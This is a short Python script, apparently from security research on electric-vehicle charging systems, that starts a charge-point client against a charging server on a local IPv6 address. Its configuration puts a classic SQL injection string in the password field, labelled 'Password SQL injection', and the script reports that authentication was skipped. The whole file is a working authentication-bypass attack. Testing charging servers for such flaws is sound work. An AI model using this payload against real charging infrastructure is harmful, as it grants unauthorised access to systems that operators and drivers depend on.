import sys
sys.path.append('.')

import asyncio

from charging.client.client2 import launch_client, get_host_and_port, ChargePointClient

N_INSTANCES = 10_000

def _get_config() -> dict[str, str]:
    return {
        'vendor_name': 'EurecomCharge',
        'model': 'E2507',
        'serial_number': 'E2507-8420-1274',
        # Password SQL injection
        'password': "steal' OR '1=1'--",
        'server': "[fe80::e3a6:46e4:bff9:fb8e%ens33]",
        'port': 9000
    }


async def _no_action(_: ChargePointClient):
    pass


async def main():
    # Launch client
    asyncio.create_task(launch_client(**_get_config(), **get_host_and_port(), async_runnable=_no_action))

    print(f"Authentication skipped with SQL injection")


if __name__ == "__main__":
    asyncio.run(main())
